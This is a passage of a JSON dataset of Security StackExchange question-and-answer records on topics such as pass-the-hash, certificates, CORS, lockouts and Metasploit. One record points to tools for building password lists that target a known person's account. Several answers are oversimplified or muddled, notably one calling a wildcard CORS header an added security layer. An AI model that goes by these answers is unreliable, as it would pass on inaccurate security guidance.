      "question": "Is there any way to log in with a hash?\nI've understood that the following steps are taken when I log in to a site:\n1. My password is hashed\n2. The hash is compared to what's stored in the database.\n3. If the hashes are equal, I can log in. \nI'm also quite certain that if attackers gain access to the password database, they can use brute force to find the clear-text passwords if the hashing algorithm is weak enough. \nMy question is, is there any way for an attacker to bypass step 1 above? I.e. if he/she has gained access to a list of hashed passwords, can the hacker present that hash to the server, thus circumventing the hashing step?",
      "answer": "This is generally called 'Pass-the-hash' attack.\nIf authenticating party performs hashing itself and sends hash over the wire then system is likely susceptible to this attack.\nMost web applications don't do this though. They instead send the password and server does hashing, so there's no way to send hash directly."
    }
  },
  {
    "instruction": "What is the answer to this question - How can Antivirus differentiate between a Trojan and a normal remote desktop application software?\nRAT (Remote Access Tool, e.g. Sub7) are considered malicious by Antivirus software. How can it distinguish between such patches and a client application for commercial  software like NetSupport School?!\n\n",
    "context": "",
    "output": "Despite outrageous marketing claims to the contrary, antivirus software is not smart. Antivirus does not recognize \"types\" of software, as in \"mmh... this looks like a tool for RAT\". There are strong theoretical reasons why this sort of detection is, in all generality, impossible to achieve, and correspondingly very hard to do in practice.\nWhat antivirus does is to look up the software they see (which is, ultimately, a sequence of bytes) in a big database of \"known evil software\". The antivirus vendor works hard, every day, to include in that database malware which has been observed in the wild -- i.e. most malware you are likely to encounter, but not Net support school software, which the human antivirus vendor are deemed \"not evil\".",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How can Antivirus differentiate between a Trojan and a normal remote desktop application software?\nRAT (Remote Access Tool, e.g. Sub7) are considered malicious by Antivirus software. How can it distinguish between such patches and a client application for commercial  software like NetSupport School?!",
      "answer": "Despite outrageous marketing claims to the contrary, antivirus software is not smart. Antivirus does not recognize \"types\" of software, as in \"mmh... this looks like a tool for RAT\". There are strong theoretical reasons why this sort of detection is, in all generality, impossible to achieve, and correspondingly very hard to do in practice.\nWhat antivirus does is to look up the software they see (which is, ultimately, a sequence of bytes) in a big database of \"known evil software\". The antivirus vendor works hard, every day, to include in that database malware which has been observed in the wild -- i.e. most malware you are likely to encounter, but not Net support school software, which the human antivirus vendor are deemed \"not evil\"."
    }
  },
  {
    "instruction": "What is the answer to this question - Why do sites implement locking after three failed password attempts?\nI know the reasoning behind not letting infinite password attempts - brute force attempts is not a meatspace weakness, but a problem with computer security - but where did they get the number three from?\nIsn't denial of service a concern when implementing a lockout policy that is easily activated?\nIs there any hard research showing an optimal number or range to choose before locking out an account that balances actual security threat with usability?  \nThinking it through, I don't see any measurable security difference between three attempts and 20 attempts with the password complexity generally in use today. \n(I know this skirts subjectivity, but I'm looking for measurement based opinions)\n\n",
    "context": "",
    "output": "Recently, at the OWASP AppSec 2010 conference in Orange County, Bill Cheswick from AT&T talked at length about this issue.\nIn brief, there's insufficient research.\nIn long, here are some of his ideas for less painful account locking:\n\nDon't count duplicate password attempts (they probably thought they mistyped it)\nMake the password hint about the primary password, and don't have a (weak) secondary\nAllow a trusted party to vouch for the user, so he can change his password.\nLock the account in increasing time increments\nRemind the user of password rules.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Why do sites implement locking after three failed password attempts?\nI know the reasoning behind not letting infinite password attempts - brute force attempts is not a meatspace weakness, but a problem with computer security - but where did they get the number three from?\nIsn't denial of service a concern when implementing a lockout policy that is easily activated?\nIs there any hard research showing an optimal number or range to choose before locking out an account that balances actual security threat with usability?  \nThinking it through, I don't see any measurable security difference between three attempts and 20 attempts with the password complexity generally in use today. \n(I know this skirts subjectivity, but I'm looking for measurement based opinions)",
      "answer": "Recently, at the OWASP AppSec 2010 conference in Orange County, Bill Cheswick from AT&T talked at length about this issue.\nIn brief, there's insufficient research.\nIn long, here are some of his ideas for less painful account locking:\n\nDon't count duplicate password attempts (they probably thought they mistyped it)\nMake the password hint about the primary password, and don't have a (weak) secondary\nAllow a trusted party to vouch for the user, so he can change his password.\nLock the account in increasing time increments\nRemind the user of password rules."
    }
  },
  {
    "instruction": "Answer the question below.\nValidating the ROA certificate\nSuppose I have a system, where the server requires the clients to attach their ROA certificate to prove that they have the right to that IP Prefix. \nNow if the client attaches the ROA certificate ( which has an extension of .roa ) , I am able to pretty print it using rcynic. \nWhen I print it , there are different fields for validity, IP prefix , public key, etc.  N\nI have come across the RPKI protocol where the ROA's are cached in the router's database and is constantly updated. But I want to know weather I can assume that If a client posseses a ROA certificate, it is valid(after confirming the fields of validity)? Or is there a way to verify that the certificate is valid.",
    "context": "",
    "output": "One of the key factors (pardon the pun) of RPKI is the network of 'trust anchors' (think CAs) that validate the ROA certificates. You need to check with them to see if the submitted ROA is valid.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Validating the ROA certificate\nSuppose I have a system, where the server requires the clients to attach their ROA certificate to prove that they have the right to that IP Prefix. \nNow if the client attaches the ROA certificate ( which has an extension of .roa ) , I am able to pretty print it using rcynic. \nWhen I print it , there are different fields for validity, IP prefix , public key, etc.  N\nI have come across the RPKI protocol where the ROA's are cached in the router's database and is constantly updated. But I want to know weather I can assume that If a client posseses a ROA certificate, it is valid(after confirming the fields of validity)? Or is there a way to verify that the certificate is valid.",
      "answer": "One of the key factors (pardon the pun) of RPKI is the network of 'trust anchors' (think CAs) that validate the ROA certificates. You need to check with them to see if the submitted ROA is valid."
    }
  },
  {
    "instruction": "Answer the following question:\n\nSharing an expired certificate?\nToday one of our certificates expired and I needed to order a new one. When collecting all the data needed to create a new one, I got the idea that all needed information is already contained in the expired existing certificate.\nAre there any security threats when sending a expired certificate (x.509, private key) to someone else so they can extract all the information they need from this expired certificate for any reason?\nDoes it make any difference if they create a new certificate(We need a certificate for user ABC just like this expired one from user XYZ) or if they renew the old one in this context?",
    "context": "",
    "output": "It's fine to reuse the data from the old certificate, but do NOT send anyone your new private key. The convention is to send a certificate authority a CSR (certificate signing request), which will contain the client's public key, start date, end date and distinguished name (country, common name, organization name, etc.). The only thing missing is the certificate authority's signature, which they will append to your CSR, thereby making it an actual certificate.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Sharing an expired certificate?\nToday one of our certificates expired and I needed to order a new one. When collecting all the data needed to create a new one, I got the idea that all needed information is already contained in the expired existing certificate.\nAre there any security threats when sending a expired certificate (x.509, private key) to someone else so they can extract all the information they need from this expired certificate for any reason?\nDoes it make any difference if they create a new certificate(We need a certificate for user ABC just like this expired one from user XYZ) or if they renew the old one in this context?",
      "answer": "It's fine to reuse the data from the old certificate, but do NOT send anyone your new private key. The convention is to send a certificate authority a CSR (certificate signing request), which will contain the client's public key, start date, end date and distinguished name (country, common name, organization name, etc.). The only thing missing is the certificate authority's signature, which they will append to your CSR, thereby making it an actual certificate."
    }
  },
  {
    "instruction": "Answer the question below.\nWhat determines the type of HTTPS indicator shown by Chrome?\nI noticed recently that Chrome 55 shows different HTTPS indicators - sometimes it shows \" Secure\", sometimes it indicates the company name (which, to my understanding, is associated with the HTTPS certificate) - and I was hoping someone could shed some light on why this is the case.\nExamples below:",
    "context": "",
    "output": "Many web browsers now will differentiate the \"padlock\" placed beside a web address when the website uses different types of SSL/TLS certificates. These certificates are used to generate a secure session in which data is encrypted between your browser and the destination web server.\nThe example you have provided is a difference between eV (extended Validation) and \"regular\" certificates.\nIn the case of eV certificates, there is a much more rigorous, and in depth procedure when obtaining such a certificate. Company information and owner information are examples of details required in a eV certificate. It allows visitors to identify the website, and verify the company who holds the certificate, is in fact the one running the website. Owner information and such are not required when requesting a \"normal\" SSL/TLS certificate.\nFirefox makes a bigger differentiation for eV certificates, where a simple green padlock is replaced with a wider green bar containing the company's name and country abbreviation (US/CAN/UK).",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "What determines the type of HTTPS indicator shown by Chrome?\nI noticed recently that Chrome 55 shows different HTTPS indicators - sometimes it shows \" Secure\", sometimes it indicates the company name (which, to my understanding, is associated with the HTTPS certificate) - and I was hoping someone could shed some light on why this is the case.\nExamples below:",
      "answer": "Many web browsers now will differentiate the \"padlock\" placed beside a web address when the website uses different types of SSL/TLS certificates. These certificates are used to generate a secure session in which data is encrypted between your browser and the destination web server.\nThe example you have provided is a difference between eV (extended Validation) and \"regular\" certificates.\nIn the case of eV certificates, there is a much more rigorous, and in depth procedure when obtaining such a certificate. Company information and owner information are examples of details required in a eV certificate. It allows visitors to identify the website, and verify the company who holds the certificate, is in fact the one running the website. Owner information and such are not required when requesting a \"normal\" SSL/TLS certificate.\nFirefox makes a bigger differentiation for eV certificates, where a simple green padlock is replaced with a wider green bar containing the company's name and country abbreviation (US/CAN/UK)."
    }
  },
  {
    "instruction": "Q: Why oauth use a secret with temporal credentials?\nI am trying to understand oauth protocol. I am currently looking at temporal credentials section of the oauth 1.0 sepecification.\nI can't understand why the secret is needed along with the temporal credentials. Secret is sent with the token itself. So if someone other than the app can get the token he can get the secret as well. right? So what is the reason for adding a secret?",
    "context": "",
    "output": " A: Secret is sent only once from OAuth provider to app's server via SSL connection and then stored on app's site never leaving it later, while open part of token travels from a client to app's site with each request (leave alone session caching for now). SSL is designed to resist sniffing, being implemented properly and employing latest strong algorithms, so without compromising SSL algorithms, SSL certification scheme or app's site itself (perhaps, the weakest link...), it's not practically possible to obtain secret and forge fake request from unauthorised clients.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Why oauth use a secret with temporal credentials?\nI am trying to understand oauth protocol. I am currently looking at temporal credentials section of the oauth 1.0 sepecification.\nI can't understand why the secret is needed along with the temporal credentials. Secret is sent with the token itself. So if someone other than the app can get the token he can get the secret as well. right? So what is the reason for adding a secret?",
      "answer": "Secret is sent only once from OAuth provider to app's server via SSL connection and then stored on app's site never leaving it later, while open part of token travels from a client to app's site with each request (leave alone session caching for now). SSL is designed to resist sniffing, being implemented properly and employing latest strong algorithms, so without compromising SSL algorithms, SSL certification scheme or app's site itself (perhaps, the weakest link...), it's not practically possible to obtain secret and forge fake request from unauthorised clients."
    }
  },
  {
    "instruction": "Answer the following question:\n\nGood site/account security tips and practices\nI'm working on site security for my website. However I'm having trouble making the security better.\nHow can I increase the site security?\nHow can I increase user security?\nNow, when I say user security, I mean like users themselves being able to build up their own security to keep their account(s) safe.",
    "context": "",
    "output": "Bad news, you can't do much!\nYou can never trust a user, their input, or anything else about them. The most you can trust is they are using your service. Even then you can't always trust that they aren't being impersonated.\nFor site security there is the gamut of usual suspects(Use SSL and make sure you get a good grade on ssllabs, sanitize input, secure SSH access and admin access to specific static IPs, so forth and onward to infinity and beyond, too broad of a question to answer here), however increasing a user's security on their end is impossible. You can't force a user to do anything, so the best you can do is make your site and database as secure as possible.\nReally the most you can do for a user is enforce strong passwords. Even then they might try to get around it.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Good site/account security tips and practices\nI'm working on site security for my website. However I'm having trouble making the security better.\nHow can I increase the site security?\nHow can I increase user security?\nNow, when I say user security, I mean like users themselves being able to build up their own security to keep their account(s) safe.",
      "answer": "Bad news, you can't do much!\nYou can never trust a user, their input, or anything else about them. The most you can trust is they are using your service. Even then you can't always trust that they aren't being impersonated.\nFor site security there is the gamut of usual suspects(Use SSL and make sure you get a good grade on ssllabs, sanitize input, secure SSH access and admin access to specific static IPs, so forth and onward to infinity and beyond, too broad of a question to answer here), however increasing a user's security on their end is impossible. You can't force a user to do anything, so the best you can do is make your site and database as secure as possible.\nReally the most you can do for a user is enforce strong passwords. Even then they might try to get around it."
    }
  },
  {
    "instruction": "Q: Letsencrypt not valid in Firefox or PHP, but valid in Chromium\nI just moved one of my websites to https, using Letsencrypt.\nI am using Linux, and my Chromium correctly verifies website certificate, but Firefox shows it as invalid. I also have an API on the website, and using a simple PHP script (with curl) to test API also gives invalid certificate error.\nI tried downloading curl certificate bundle, and giving it to my PHP script. No luck, as I have found the provided bundle is generated from Mozilla.\nThe question is, is Letsencrypt really OK to use? Any sources to find more information about this? I don't want my users to see the ugly browser page, saying website is not secure, because I have online payment in website and it really hurts business.\nUPDATE:\nHere is my sample Apache configuration:\nSSLEngine on\nSSLCertificateFile \"/etc/letsencrypt/live/example.com/fullchain.pem\"\nSSLCertificateKeyFile \"/etc/letsencrypt/live/example.com/privkey.pem\"\n\nAnd just to mention, I am running CentOS 7 with Apache 2.4.\nUPDATE2:\nI just found that my Android phone also treats website as invalid. HTC M8, both Chrome and Firefox give invalid certificate. Phone is updated (Android 6).\nI just suspect the configuration is maybe wrong somehow, but why Chromium on my PC gives a green light?",
    "context": "",
    "output": " A: I just suspect the configuration is maybe wrong somehow, but why Chromium on my PC gives a green light?\n\nIf you check your site with SSLLabs you will probably see that it has chain issues, i.e. missing an intermediate certificate. Chrome on Desktop tries to fill in missing certificates by itself and thus works. Firefox will only fill in a missing intermediate if it knows it from some earlier visit to some other site. Mobile browsers will usually not try to work around server side misconfiguration this way and neither to PHP, Python, Java... .",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Letsencrypt not valid in Firefox or PHP, but valid in Chromium\nI just moved one of my websites to https, using Letsencrypt.\nI am using Linux, and my Chromium correctly verifies website certificate, but Firefox shows it as invalid. I also have an API on the website, and using a simple PHP script (with curl) to test API also gives invalid certificate error.\nI tried downloading curl certificate bundle, and giving it to my PHP script. No luck, as I have found the provided bundle is generated from Mozilla.\nThe question is, is Letsencrypt really OK to use? Any sources to find more information about this? I don't want my users to see the ugly browser page, saying website is not secure, because I have online payment in website and it really hurts business.\nUPDATE:\nHere is my sample Apache configuration:\nSSLEngine on\nSSLCertificateFile \"/etc/letsencrypt/live/example.com/fullchain.pem\"\nSSLCertificateKeyFile \"/etc/letsencrypt/live/example.com/privkey.pem\"\n\nAnd just to mention, I am running CentOS 7 with Apache 2.4.\nUPDATE2:\nI just found that my Android phone also treats website as invalid. HTC M8, both Chrome and Firefox give invalid certificate. Phone is updated (Android 6).\nI just suspect the configuration is maybe wrong somehow, but why Chromium on my PC gives a green light?",
      "answer": "I just suspect the configuration is maybe wrong somehow, but why Chromium on my PC gives a green light?\n\nIf you check your site with SSLLabs you will probably see that it has chain issues, i.e. missing an intermediate certificate. Chrome on Desktop tries to fill in missing certificates by itself and thus works. Firefox will only fill in a missing intermediate if it knows it from some earlier visit to some other site. Mobile browsers will usually not try to work around server side misconfiguration this way and neither to PHP, Python, Java... ."
    }
  },
  {
    "instruction": "Answer this question:\n\nHow data decryption and integrity check occur in SSL/TLS?\nDuring the SSL/TLS handshake, and just after completing the key exchange phase, each of the client and the server derives a pair of keys for encryption and authentication/integrity protection from the master secret such as :\n\nKc = encryption key for data sent from client to server\nMc = MAC key for data sent from client to server\nKs = encryption key for data sent from server to client\nMs = MAC key for data sent from server to client\n\nSince the server and client are using a symmetric cryptosystem for encrypting/decrypting exchanged data, how would the server; using his key Ks; decrypt an encrypted message Kc{message} sent by the client since both are not using the same key for encryption/decryption (i.e. Kc#Ks) ? Same question applies for MAC integrity check.",
    "context": "",
    "output": "A: My guess is that you either not fully understand which keys get derived from the master key on both sides or that you don't understand the concept of symmetric encryption. I.e. one of these points might not have been clear enough to you:\n\nClient and server share the same master secret.\nClient and server derive Kc, Mc, Ks, Ms from this master key. Since the master key is the same the values for Kc, Mc, Ks, Ms are the same too at client and server.\nSymmetric encryption means that the same key as used for encryption and decryption. This means client encrypts with Kc and server decrypts the cipher text with the same Kc. And the same is done with Ks for messages encrypted by the server and decrypted by the client.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How data decryption and integrity check occur in SSL/TLS?\nDuring the SSL/TLS handshake, and just after completing the key exchange phase, each of the client and the server derives a pair of keys for encryption and authentication/integrity protection from the master secret such as :\n\nKc = encryption key for data sent from client to server\nMc = MAC key for data sent from client to server\nKs = encryption key for data sent from server to client\nMs = MAC key for data sent from server to client\n\nSince the server and client are using a symmetric cryptosystem for encrypting/decrypting exchanged data, how would the server; using his key Ks; decrypt an encrypted message Kc{message} sent by the client since both are not using the same key for encryption/decryption (i.e. Kc#Ks) ? Same question applies for MAC integrity check.",
      "answer": "My guess is that you either not fully understand which keys get derived from the master key on both sides or that you don't understand the concept of symmetric encryption. I.e. one of these points might not have been clear enough to you:\n\nClient and server share the same master secret.\nClient and server derive Kc, Mc, Ks, Ms from this master key. Since the master key is the same the values for Kc, Mc, Ks, Ms are the same too at client and server.\nSymmetric encryption means that the same key as used for encryption and decryption. This means client encrypts with Kc and server decrypts the cipher text with the same Kc. And the same is done with Ks for messages encrypted by the server and decrypted by the client."
    }
  },
  {
    "instruction": "Generate a password dictionary from simple information\nSuppose that we are going to perform a dictionary attack to crack the password of a known account. If we have some simple information from the account owner, such as first name, surname, age, date of birth, birthplace, etc, in form of a wordlist, is there any tool to automatically generate a more complex password dictionary, say by combining different words, capitalizing them, mutating, etc?",
    "context": "",
    "output": "There is already an open source tool out there that does this. It's called CeWL. It comes with Kali Linux or available on GitHub. \nYou can also use Crunch.\nA third option: Transmute.py",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Generate a password dictionary from simple information\nSuppose that we are going to perform a dictionary attack to crack the password of a known account. If we have some simple information from the account owner, such as first name, surname, age, date of birth, birthplace, etc, in form of a wordlist, is there any tool to automatically generate a more complex password dictionary, say by combining different words, capitalizing them, mutating, etc?",
      "answer": "There is already an open source tool out there that does this. It's called CeWL. It comes with Kali Linux or available on GitHub. \nYou can also use Crunch.\nA third option: Transmute.py"
    }
  },
  {
    "instruction": "What is the answer to this question - When is EXCEPTION_REGISTRATION_RECORD created on the stack?\nI want to understand when EXCEPTION_REGISTRATION_RECORDs get created on the stack.\n\nAre they created when the program starts?\nAre they created when we enter the function?\nOr are they created only when the exception occurs?\n\nIs it true that there is one EXCEPTION_REGISTRATION_RECORD per try/catch?\n\n",
    "context": "",
    "output": "EXCEPTION_REGISTRATION_RECORD is placed on the stack in anticipation of an exception occurring.  The \"try\" will put one there.  The record is part of a chain, for as many nested \"try\" statements as exist.  The nesting includes one function calling another function from within a try block.  Windows will also put a top-most handler there before the program starts, so there is always one on program start.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "When is EXCEPTION_REGISTRATION_RECORD created on the stack?\nI want to understand when EXCEPTION_REGISTRATION_RECORDs get created on the stack.\n\nAre they created when the program starts?\nAre they created when we enter the function?\nOr are they created only when the exception occurs?\n\nIs it true that there is one EXCEPTION_REGISTRATION_RECORD per try/catch?",
      "answer": "EXCEPTION_REGISTRATION_RECORD is placed on the stack in anticipation of an exception occurring.  The \"try\" will put one there.  The record is part of a chain, for as many nested \"try\" statements as exist.  The nesting includes one function calling another function from within a try block.  Windows will also put a top-most handler there before the program starts, so there is always one on program start."
    }
  },
  {
    "instruction": "Please answer this question: Are the Linux community/universe repositories significantly less safe then the main repositories?\nIf so what makes community/universe less safe? Is there less testing or is it simply less safe because more people could put malware in them.",
    "context": "",
    "output": "No, it shouldn't scare you if you're worried about safety of packages. Though I do not recommend using it since it's not officially supported.\nUniverse is community maintained software, that is to say \"not officially supported software\".\nI recommend you read this article so you'll understand the differences between Main, Restricted, Universe, and Multiverse repositories.\nGood Luck",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Are the Linux community/universe repositories significantly less safe then the main repositories?\nIf so what makes community/universe less safe? Is there less testing or is it simply less safe because more people could put malware in them.",
      "answer": "No, it shouldn't scare you if you're worried about safety of packages. Though I do not recommend using it since it's not officially supported.\nUniverse is community maintained software, that is to say \"not officially supported software\".\nI recommend you read this article so you'll understand the differences between Main, Restricted, Universe, and Multiverse repositories.\nGood Luck"
    }
  },
  {
    "instruction": "Answer the question below.\nLimiting information disclosed by server\nI host a web application on an Ubuntu 14.04 based VM hosted on Microsoft Azure infrastructure. The webserver is nginx. Recently, someone was trying to probe my server, and later correctly surmised that I was using Microsoft's cloud. \nHow would they have found this out and how can I mask this information from probers (if at all)? \nNote that if I run curl -I http://localhost, it doesn't give away a lot of information since I've turned server tokens off.",
    "context": "",
    "output": "It most likely doesn't matter what your server tells the client, the IP address used to communicate with your virtual azure server is owned by Microsoft and most likely labeled as being used for their cloud offering. You have no influence on this, but it is not a security risk either.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Limiting information disclosed by server\nI host a web application on an Ubuntu 14.04 based VM hosted on Microsoft Azure infrastructure. The webserver is nginx. Recently, someone was trying to probe my server, and later correctly surmised that I was using Microsoft's cloud. \nHow would they have found this out and how can I mask this information from probers (if at all)? \nNote that if I run curl -I http://localhost, it doesn't give away a lot of information since I've turned server tokens off.",
      "answer": "It most likely doesn't matter what your server tells the client, the IP address used to communicate with your virtual azure server is owned by Microsoft and most likely labeled as being used for their cloud offering. You have no influence on this, but it is not a security risk either."
    }
  },
  {
    "instruction": "Answer the following question:\n\nIs sqlmap scan detectable?\nI have a REST API running on a server.\nIs there a way to detect an unexpected sqlmap analysis?",
    "context": "",
    "output": "SQLMap works by sending a lot of different requests to the server. It is pretty easy to see the scan if you look at your server logs manually. \nIf you want to do it programatically, just look for SQL verbs in your logs in the input fields where they don't make sense (select, from, where, order by).",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Is sqlmap scan detectable?\nI have a REST API running on a server.\nIs there a way to detect an unexpected sqlmap analysis?",
      "answer": "SQLMap works by sending a lot of different requests to the server. It is pretty easy to see the scan if you look at your server logs manually. \nIf you want to do it programatically, just look for SQL verbs in your logs in the input fields where they don't make sense (select, from, where, order by)."
    }
  },
  {
    "instruction": "Q: Will brute force attack exhaust web server, resulting in DOS\nI do know the difference between brute force attack and DOS.\nWhat if a web server doesn't have account lock out in place and a few brute force attacks is being started in parallel, and these attacks will keep web server CPU intensively busy. Will these attacks in the end reduce the abilities of web server to serve other legitimate requests and result in a DOS attack?",
    "context": "",
    "output": " A: YES INDEED\nI used to own a shared hosting business and, while being at a party on a weekend night, I received an automated monitoring notification triggered by a resource exhaustion. I immediately left to the office and when I arrived I found out a bruteforce attack against a client's WordPress admin panel was the cause of it.\nAlways make sure your firewall rulesets are up to date and that a service can't take others' resources in case of an anomalous event (containerization is your friend here).",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Will brute force attack exhaust web server, resulting in DOS\nI do know the difference between brute force attack and DOS.\nWhat if a web server doesn't have account lock out in place and a few brute force attacks is being started in parallel, and these attacks will keep web server CPU intensively busy. Will these attacks in the end reduce the abilities of web server to serve other legitimate requests and result in a DOS attack?",
      "answer": "YES INDEED\nI used to own a shared hosting business and, while being at a party on a weekend night, I received an automated monitoring notification triggered by a resource exhaustion. I immediately left to the office and when I arrived I found out a bruteforce attack against a client's WordPress admin panel was the cause of it.\nAlways make sure your firewall rulesets are up to date and that a service can't take others' resources in case of an anomalous event (containerization is your friend here)."
    }
  },
  {
    "instruction": "Answer the question below.\nHow to destroy old credit card?\nWhat is the best (in terms of security) way to destroy old (but still working) credit card?",
    "context": "",
    "output": "Best way? I'd say, melt it into a ball.  However, I generally just aggressively attack them with scissors and throw various parts in various trash containers.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How to destroy old credit card?\nWhat is the best (in terms of security) way to destroy old (but still working) credit card?",
      "answer": "Best way? I'd say, melt it into a ball.  However, I generally just aggressively attack them with scissors and throw various parts in various trash containers."
    }
  },
  {
    "instruction": "Can you tell me the answer to: Is it safe to add \"Access-Control-Allow-Origin:*\" to an API endpoint with custom authentication via header?\nLets say I have a site at myapp.com that talks to the api at myapi.com. For that to work I have to turn on CORS. I want to do it like that:\nAccess-Control-Allow-Origin: *\nand my API authentication is performed via a custom Authorize header (with e.g. Bearer token).\nAs far as I can see it is safe to do since an attacker website would have a way of obtaining this token or sending it automatically.\nIs this correct?\nP.S. I want to have a \"*\" to e.g. not have problems with localhost development or some other environments where myapp.com runs, e.g. stage-myapp.com, etc.",
    "context": "",
    "output": "answer: Theoretically, the Access-Control-Allow-Origin: * is just another defense in depth solution.\nit's an easy way to make your endpoint have 1 more layer of security, especially from malicious websites tricking browsers.\nit is by no means a sole solution to protect an api endpoint with (custom clients can just ignore the header. and   attackers will just work around it if they can)\nSo, if your API has proper other safeguards and monitoring you can set this header to the * value. (older browsers still ignore this header anyway).\nGoogle and Facebook however have a dedicated team protecting there infrastructure from abuse, so they are bad examples to use for your consideration.\nin the end its all down to your threat model... does it allow for this type of use r not. (e.a. is your system prepared for the potential abuse of your API or do you really need the additional protection that this header offers.\nA possible workaround is making your API smart enough to return a custom header depending on where the request came from and limit that list to a whitelist of allowed domains.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Is it safe to add \"Access-Control-Allow-Origin:*\" to an API endpoint with custom authentication via header?\nLets say I have a site at myapp.com that talks to the api at myapi.com. For that to work I have to turn on CORS. I want to do it like that:\nAccess-Control-Allow-Origin: *\nand my API authentication is performed via a custom Authorize header (with e.g. Bearer token).\nAs far as I can see it is safe to do since an attacker website would have a way of obtaining this token or sending it automatically.\nIs this correct?\nP.S. I want to have a \"*\" to e.g. not have problems with localhost development or some other environments where myapp.com runs, e.g. stage-myapp.com, etc.",
      "answer": "Theoretically, the Access-Control-Allow-Origin: * is just another defense in depth solution.\nit's an easy way to make your endpoint have 1 more layer of security, especially from malicious websites tricking browsers.\nit is by no means a sole solution to protect an api endpoint with (custom clients can just ignore the header. and   attackers will just work around it if they can)\nSo, if your API has proper other safeguards and monitoring you can set this header to the * value. (older browsers still ignore this header anyway).\nGoogle and Facebook however have a dedicated team protecting there infrastructure from abuse, so they are bad examples to use for your consideration.\nin the end its all down to your threat model... does it allow for this type of use r not. (e.a. is your system prepared for the potential abuse of your API or do you really need the additional protection that this header offers.\nA possible workaround is making your API smart enough to return a custom header depending on where the request came from and limit that list to a whitelist of allowed domains."
    }
  },
  {
    "instruction": "Metasploit - Does the multi handler sends the payload, or just listens for connection\nDoes the metasploit module: exploit/multi/handler \n\nsends payloads to stagers?\nOr does it just listens for an incoming connection like a netcat\nlistener?\nOr does it do both, as needed?",
    "context": "",
    "output": "It depends. The exploit/multi/handler is more of a stub for whatever payload handler you need to run. So whichever payload you select (with set payload ...) is responsible for doing whatever it needs, just like if you were running it from a regular exploit module.\nSo yes, from a multi-handler, any of the following could happen:\n\nA simple socket listener/connection, like netcat (for plain shell payloads)\nA handler for stager payloads that uploads Meterpreter (for meterpreter/* payloads)\nA handler for single-stage (stageless?) Meterpreter (for meterpreter_* payloads)",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Metasploit - Does the multi handler sends the payload, or just listens for connection\nDoes the metasploit module: exploit/multi/handler \n\nsends payloads to stagers?\nOr does it just listens for an incoming connection like a netcat\nlistener?\nOr does it do both, as needed?",
      "answer": "It depends. The exploit/multi/handler is more of a stub for whatever payload handler you need to run. So whichever payload you select (with set payload ...) is responsible for doing whatever it needs, just like if you were running it from a regular exploit module.\nSo yes, from a multi-handler, any of the following could happen:\n\nA simple socket listener/connection, like netcat (for plain shell payloads)\nA handler for stager payloads that uploads Meterpreter (for meterpreter/* payloads)\nA handler for single-stage (stageless?) Meterpreter (for meterpreter_* payloads)"
    }
  },
  {
    "instruction": "Q: How to find each interrupt's line in the Interrupt Descriptor Table\nI'm trying to find the line number of the 0f05 syscall interrupt with no success.\nI searched everywhere and couldn't find any way of doing that, it seems like this information is hard coded in the CPU (which make sense).\nMy goal is to follow the debugger to the kernel code but currently I don't know which function I need to put a break point on.\nWhen I do \"step into\" on the syscall line it simply move to the next instruction like it is mov or something\nThanks",
    "context": "",
    "output": " A: The AMD64 syscall instruction is not an interrupt (neither software nor hardware). The destination of it is stored not in IDT but in a Machine-specific register (MSR) called IA32_LSTAR.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How to find each interrupt's line in the Interrupt Descriptor Table\nI'm trying to find the line number of the 0f05 syscall interrupt with no success.\nI searched everywhere and couldn't find any way of doing that, it seems like this information is hard coded in the CPU (which make sense).\nMy goal is to follow the debugger to the kernel code but currently I don't know which function I need to put a break point on.\nWhen I do \"step into\" on the syscall line it simply move to the next instruction like it is mov or something\nThanks",
      "answer": "The AMD64 syscall instruction is not an interrupt (neither software nor hardware). The destination of it is stored not in IDT but in a Machine-specific register (MSR) called IA32_LSTAR."
    }
  },
  {
    "instruction": "Answer the following question:\n\nWhy do some antivirus programs find infections that others miss?\nI have Avast Free antivirus on my Windows 7 PC and yesterday I used Bit Defender quick scan addons, which spotted a virus. In rechecking with Avast, it didn't pick it up.\nIn scanning my system with ESET Online Scanner it shows no virus, but when I scan it with ClamWin it does find it (but with a different name)\nWhy do they give different results?",
    "context": "",
    "output": "Antivirus compares known hashes of viruses to the hashes of your files.  When the hashes match it blows the box and tells you about it.  These companies operate their own databases for known malware hashes.  Therefore one company may have a hash identified that another does not.\nA lot of malware is now generated on the fly by the attack site.  Meaning it uses a polymorphic payload encoder to manipulate the virus code (without changing how the code operates) to make a new hash that no antivirus company has yet.  Essentially every victim gets a hash that the companies don't have.  Now, the companies eventually see these hashes one by one and that's why one company may have the new hash while the other does not.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
